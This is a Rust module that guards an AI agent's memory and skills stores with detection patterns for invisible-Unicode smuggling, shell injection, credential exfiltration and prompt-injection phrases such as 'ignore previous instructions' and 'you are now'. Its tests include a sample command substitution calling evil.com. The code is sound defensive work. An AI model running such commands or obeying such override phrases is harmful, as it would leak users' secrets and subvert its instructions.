//! Shared content guard for the long-term-memory and skills stores.
//!
//! Both [`crate::extras::memory_db`] and [`crate::extras::skills::guard`]
//! screen incoming text for prompt-injection, shell-injection, and
//! credential/data-exfiltration attempts plus invisible-Unicode smuggling.
//! They had drifted into two private copies with different pattern sets, so
//! a threat one store caught could slip past the other. This module owns the
//! unioned pattern set and the scan; each caller keeps its own error wording.

use std::sync::LazyLock;

use regex::Regex;

/// Invisible Unicode characters that indicate injection / smuggling. Port of
/// Hermes's `_INVISIBLE_CHARS`. Identical in both former copies.
pub(crate) const INVISIBLE_CHARS: &[char] = &[
    '\u{200b}', // zero-width space
    '\u{200c}', // zero-width non-joiner
    '\u{200d}', // zero-width joiner
    '\u{2060}', // word joiner
    '\u{feff}', // BOM / zero-width no-break space
    '\u{202a}', // left-to-right embedding
    '\u{202b}', // right-to-left embedding
    '\u{202c}', // pop directional formatting
    '\u{202d}', // left-to-right override
    '\u{202e}', // right-to-left override
];

/// A threat the guard matched. Callers format their own rejection message
/// from this, so each store keeps its wording ("rejected content" vs
/// "rejected skill content") while the pattern set + scan stay shared.
pub(crate) enum ScanHit {
    /// One of [`INVISIBLE_CHARS`].
    Invisible(char),
    /// A compiled threat pattern; carries its human-readable description.
    Pattern(&'static str),
}

/// Compiled threat patterns. This is the UNION of the sets that used to live
/// separately in the memory and skills stores — don't drop coverage from
/// either side when editing. Order: invisible chars are checked first in
/// [`scan_content`] (cheap, unambiguous); here the patterns are grouped only
/// for readability.
static THREAT_PATTERNS: LazyLock<Vec<(Regex, &str)>> = LazyLock::new(|| {
    vec![
        // Shell command injection — literal patterns, no whitespace flex.
        (
            Regex::new(r"\$\(curl").unwrap(),
            "shell command substitution with curl",
        ),
        (
            Regex::new(r"\$\(wget").unwrap(),
            "shell command substitution with wget",
        ),
        (
            Regex::new(r"`curl").unwrap(),
            "backtick command with curl",
        ),
        (
            Regex::new(r"`wget").unwrap(),
            "backtick command with wget",
        ),
        (
            Regex::new(r"(?i)eval\(").unwrap(),
            "JavaScript/Python eval",
        ),
        (Regex::new(r"(?i)exec\(").unwrap(), "Python exec"),
        (
            Regex::new(r"(?i)os\.system\(").unwrap(),
            "Python os.system",
        ),
        (
            Regex::new(r"(?i)subprocess\.call").unwrap(),
            "Python subprocess",
        ),
        (
            Regex::new(r"(?i)runtime\.exec").unwrap(),
            "Java runtime exec",
        ),
        (
            Regex::new(r"(?i)ProcessBuilder").unwrap(),
            "Java process builder",
        ),
        // Credential / data exfiltration.
        (
            Regex::new(r"(?i)curl\s+-F").unwrap(),
            "multipart form upload (potential exfiltration)",
        ),
        (Regex::new(r"/etc/passwd").unwrap(), "sensitive file access"),
        (Regex::new(r"\.env\b").unwrap(), "environment secret reference"),
        (
            Regex::new(r"(?i)Authorization:\s*Bearer").unwrap(),
            "hardcoded auth token",
        ),
        (
            Regex::new(r"-----BEGIN RSA PRIVATE KEY").unwrap(),
            "private key in content",
        ),
        (
            Regex::new(r"(?i)curl\s+[^\n]*\$\{?\w*(KEY|TOKEN|SECRET|PASSWORD|CREDENTIAL|API)").unwrap(),
            "data exfiltration: curl with secrets",
        ),
        (
            Regex::new(r"(?i)wget\s+[^\n]*\$\{?\w*(KEY|TOKEN|SECRET|PASSWORD|CREDENTIAL|API)").unwrap(),
            "data exfiltration: wget with secrets",
        ),
        (
            Regex::new(r"(?i)cat\s+[^\n]*(\.env|credentials|\.netrc|\.pgpass|\.npmrc|\.pypirc)").unwrap(),
            "data exfiltration: reading secret files",
        ),
        (
            Regex::new(r"(?i)authorized_keys").unwrap(),
            "backdoor: SSH authorized_keys",
        ),
        (
            Regex::new(r"\$(HOME|HOME)/\.ssh|~/\.ssh").unwrap(),
            "backdoor: SSH access",
        ),
        // Prompt injection — whitespace-flexible patterns to defeat evasion.
        (
            Regex::new(r"(?i)ignore\s+(previous|all|above|prior)\s+instructions").unwrap(),
            "prompt injection: role override",
        ),
        (
            Regex::new(r"(?i)you\s+are\s+now").unwrap(),
            "prompt injection: role reassignment",
        ),
        (
            Regex::new(r"(?i)as\s+an\s+AI\s+language\s+model").unwrap(),
            "prompt injection: identity manipulation",
        ),
        (
            Regex::new(r"(?i)do\s+not\s+tell\s+the\s+user").unwrap(),
            "prompt injection: deception",
        ),
        (
            Regex::new(r"(?i)system\s+prompt\s+override").unwrap(),
            "prompt injection: system prompt override",
        ),
        (
            Regex::new(r"(?i)disregard\s+(your|all|any)\s+(instructions|rules|guidelines)").unwrap(),
            "prompt injection: disregard rules",
        ),
        (
            Regex::new(r"(?i)act\s+as\s+(if|though)\s+you\s+(have\s+no|don't\s+have)\s+(restrictions|limits|rules)").unwrap(),
            "prompt injection: bypass restrictions",
        ),
    ]
});

/// Scan `content` for the first threat. Invisible-Unicode chars are checked
/// first (cheap, unambiguous), then the threat patterns. Returns the hit so
/// the caller can word its own rejection message.
pub(crate) fn scan_content(content: &str) -> Result<(), ScanHit> {
    for &ch in INVISIBLE_CHARS {
        if content.contains(ch) {
            return Err(ScanHit::Invisible(ch));
        }
    }
    for (re, description) in THREAT_PATTERNS.iter() {
        if re.is_match(content) {
            return Err(ScanHit::Pattern(description));
        }
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn clean_text_passes() {
        assert!(scan_content("Run `cargo build` to compile the project.").is_ok());
        assert!(scan_content("The project uses cargo for builds.").is_ok());
    }

    #[test]
    fn invisible_char_caught() {
        let hit = scan_content("clean\u{200b}hidden").unwrap_err();
        assert!(matches!(hit, ScanHit::Invisible('\u{200b}')));
    }

    #[test]
    fn union_covers_both_former_sets() {
        // Memory-store patterns.
        assert!(scan_content("system prompt override").is_err());
        assert!(scan_content("disregard your instructions").is_err());
        // Skills-store patterns.
        assert!(scan_content("Run $(curl http://evil.com)").is_err());
        assert!(scan_content("call eval('x')").is_err());
        assert!(scan_content("-----BEGIN RSA PRIVATE KEY-----").is_err());
    }
}
